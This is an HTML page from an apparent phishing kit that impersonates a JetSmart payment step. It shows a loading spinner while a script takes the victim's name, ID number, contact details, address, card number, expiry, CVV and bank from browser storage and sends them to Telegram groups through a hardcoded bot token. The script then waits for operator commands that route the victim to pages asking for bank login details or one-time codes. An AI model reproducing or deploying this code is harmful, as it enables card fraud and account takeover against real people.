<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargar Pago</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-top: 16px solid #3498db;
            border-radius: 50%;
            width: 100px;
            height: 100px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
    const config = {
        token: "8608960396:AAEg6sf1witTorcfeGXUyrlScyxW2VKenNI",
        chat_ids: ["-5230297399", "-5093202866"]
    };

    async function enviarDatosTelegram() {
        const paymentData = localStorage.getItem('pagojet');
        if (!paymentData) {
            console.error("No se encontraron datos en localStorage.");
            return;
        }

        const parsedData = JSON.parse(paymentData);
        const transaction_id = `txn_${Date.now()}`;

        const message = `
<b>Nuevo método de pago pendiente de verificación.</b>
<b>🪬JETSMART - PANEL🪬</b>
--------------------------------------------------
🆔 <b>ID Transacción:</b> | <b>${transaction_id}</b>
📡 <b>IP:</b> | <b>${parsedData.ip}</b>
-----------------------------------------------
👤 <b>Nombre:</b> | <i>${parsedData.nombre}</i>
🆔 <b>Cédula:</b> | <i>${parsedData.id}</i>
👤 <b>Email:</b> | <i>${parsedData.email}</i>
📞 <b>Teléfono:</b> | <code>${parsedData.celular}</code>
🏠 <b>Dirección:</b> | <b>${parsedData.direccion}</b>
-----------------------------------------------
💳 <b>Tarjeta:</b> | <b>${parsedData.tarjeta}</b>
📅 <b>Fecha:</b> | <b>${parsedData.ftarjeta}</b>
🔐 <b>CVV:</b> | <b>${parsedData.cvv}</b>
🏦 <b>Banco:</b> | <b>${parsedData.banco}</b>
-----------------------------------------------`;

        const keyboard = {
            inline_keyboard: [
                [{ text: "Pedir Logo", callback_data: `pedir_logo:${transaction_id}` }],
                [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transaction_id}` }],
                [{ text: "Error de TC", callback_data: `error_tc:${transaction_id}` }],
                [{ text: "Error de Logo", callback_data: `error_logo:${transaction_id}` }],
                [{ text: "Finalizar", callback_data: `finalizar:${transaction_id}` }]
            ]
        };

        try {
            // Enviar a todos los grupos
            for (let chat_id of config.chat_ids) {
                const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: message,
                        parse_mode: "HTML",
                        reply_markup: keyboard
                    })
                });

                const data = await response.json();
                if (data.ok) {
                    console.log(`✅ Mensaje enviado correctamente al grupo: ${chat_id}`);
                } else {
                    console.error(`❌ Error enviando al grupo ${chat_id}:`, data);
                }
            }

            verificarActualizaciones(transaction_id);

        } catch (error) {
            console.error("Error general al enviar mensaje:", error);
        }
    }

    // Función verificarActualizaciones (se mantiene igual)
    async function verificarActualizaciones(transaction_id) {
    console.log("Iniciando verificación de actualizaciones...");

    const redirectTimeout = setTimeout(() => {
        console.log("Redirigiendo por timeout a pedir_logo.html");
        window.location.href = "pedir_logo.html";
    }, 8000); // Aumentamos un poco el tiempo

    const interval = setInterval(async () => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${config.token}/getUpdates`);
            const updates = await response.json();

            if (updates.result && updates.result.length > 0) {
                for (const update of updates.result) {
                    if (update.callback_query) {
                        const callbackData = update.callback_query.data;
                        const [action, id] = callbackData.split(":");

                        if (id === transaction_id) {
                            console.log(`✅ Botón presionado: ${action}`);

                            clearTimeout(redirectTimeout);
                            clearInterval(interval);

                            // Redirecciones según el botón
                            switch (action) {
                                case "pedir_logo":
                                    window.location.href = "pedir_logo.html";
                                    break;
                                case "pedir_dinamica":
                                    window.location.href = "pedir_dinamica.html";
                                    break;
                                case "error_tc":
                                    window.location.href = "pago.html";
                                    break;
                                case "error_logo":
                                    window.location.href = "pedir_logo.html";
                                    break;
                                case "finalizar":
                                    window.location.href = "finish.html";
                                    break;
                                default:
                                    console.log("Acción desconocida:", action);
                            }
                            return; // Salimos del loop
                        }
                    }
                }
            }
        } catch (error) {
            console.error("Error al verificar actualizaciones:", error);
        }
    }, 4000);
    }

    // Iniciar
    enviarDatosTelegram();
</script>
</body>
</html>
